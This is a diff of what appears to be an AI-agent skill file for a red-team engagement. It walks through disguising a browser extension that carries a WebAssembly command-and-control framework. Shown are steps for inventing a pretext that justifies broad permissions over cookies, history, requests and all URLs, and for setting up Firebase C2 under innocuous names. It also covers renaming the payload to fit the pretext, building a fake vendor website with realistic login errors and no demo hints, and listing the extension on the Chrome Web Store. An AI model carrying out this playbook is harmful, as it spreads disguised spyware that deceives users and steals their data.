@@ -75,12 +75,14 @@ Use this skill when:
 Before building anything, design the extension pretext that will justify all required permissions.
 
 **Gather engagement context:**
+
 1. **Engagement Scope**: Client organization, security testing objectives, credible pretexts for target users
 2. **Target User Profile**: Job roles, common tools/workflows, pain points extension could address
 3. **Required Permissions**: Review `modules/hypercube-ng/extension/manifest.json` for permissions needed:
    - `webRequest`, `cookies`, `storage`, `declarativeNetRequest`, `tabs`, `history`, `downloads`, `<all_urls>`
 
 **Design pretext strategy:**
+
 - **Proven categories**: Developer Tools, Productivity Tools, Security Tools, Collaboration Tools, Content Tools
 - **Critical requirement**: Pretext must naturally justify ALL permissions without suspicion
 - See [references/pretext-design.md](references/pretext-design.md) for proven patterns and permission justification strategies
@@ -88,6 +90,7 @@ Before building anything, design the extension pretext that will justify all req
 **Use AskUserQuestion to confirm pretext with user before proceeding to infrastructure deployment.**
 
 **Example pretexts:**
+
 - **DevAPI Tester Pro** (Developer Tools) - API testing and debugging for developers
 - **Antiphish Solutions** (Security Tools) - Phishing detection and protection
 - See `modules/hypercube-ng/examples/antiphish-solutions/` and `.claude/.output/agents/[timestamp]-hypercube-deployment/` for complete examples
@@ -103,6 +106,7 @@ Task(subagent_type='hypercube-deployer', prompt='Deploy hypercube-ng for [engage
 ```
 
 **The agent automates:**
+
 1. Firebase project creation with OpSec-friendly naming (e.g., `cdn-cache-5467`)
 2. Realtime Database setup and Anonymous Authentication configuration
 3. Security rules deployment for C2 communication
@@ -113,6 +117,7 @@ Task(subagent_type='hypercube-deployer', prompt='Deploy hypercube-ng for [engage
 **Output location:** `.claude/.output/agents/[timestamp]-hypercube-deployment/extension/`
 
 **What you get:**
+
 - `manifest.json` (generic, needs pretext customization)
 - `background.js` (hypercube-ng WASM loader with Firebase config)
 - `main.wasm` (compiled Go C2 framework, ~8.1MB - **rename this in Phase 3**)
@@ -149,7 +154,10 @@ mv main.wasm [pretext-appropriate-name].wasm
 const result = await WebAssembly.instantiateStreaming(fetch("main.wasm"), go.importObject);
 
 // Change to:
-const result = await WebAssembly.instantiateStreaming(fetch("[pretext-appropriate-name].wasm"), go.importObject);
+const result = await WebAssembly.instantiateStreaming(
+  fetch("[pretext-appropriate-name].wasm"),
+  go.importObject
+);
 ```
 
 **Example (DevAPI Tester Pro):** `main.wasm` → `api-validator.wasm` (validates API responses)
@@ -204,6 +212,7 @@ document.getElementById('myButton').addEventListener('click', () => { ... });
 ```
 
 **CSP Requirements:**
+
 - All JavaScript must be in separate `.js` files
 - No inline event handlers (`onclick`, `onload`, etc.)
 - No inline `<script>` tags with code
@@ -211,6 +220,7 @@ document.getElementById('myButton').addEventListener('click', () => { ... });
 - External CSS is fine, or `<style>` tags in HTML
 
 **Example (DevAPI Tester Pro):**
+
 - Request Builder tab with method selector, URL input, headers section
 - Captured Requests tab showing real-time API intercepts
 - Response inspector with formatted JSON
@@ -228,6 +238,7 @@ Create three icon sizes with unique branding:
 - `icons/icon128.png` (128x128px) - Chrome Web Store
 
 **Design guidelines:**
+
 - Use pretext-specific colors and symbols
 - Professional appearance (developers/users will see this)
 - Recognizable at 16px
@@ -278,6 +289,7 @@ See [references/store-assets.md](references/store-assets.md) for detailed requir
 #### 5.1 Required Pages (Minimum 9 Files)
 
 Create complete website with:
+
 - Homepage with hero, features, trust badges
 - Customer portal with realistic login errors
 - Privacy policy and terms of service
@@ -291,12 +303,14 @@ Create complete website with:
 #### 5.2 Critical Rules
 
 **Demo Functionality**:
+
 - ✅ Show realistic error messages ("Invalid email or password")
 - ❌ Never show "demo mode" alerts
 - ✅ Simulate loading states (button text changes, delays)
 - ✅ Display styled error notifications like real sites
 
 **Link Policy**:
+
 - ✅ All links point to site itself only
 - ❌ No external links (Chrome Store, social media, other services)
 - ❌ No social media icons in footer
@@ -315,6 +329,7 @@ Create complete website with:
 #### 5.4 Chrome Store Integration
 
 Update Chrome Web Store listing with:
+
 - **Website**: `https://your-domain.com`
 - **Privacy Policy**: `https://your-domain.com/privacy.html`
 - **Support URL**: `https://your-domain.com/support.html`
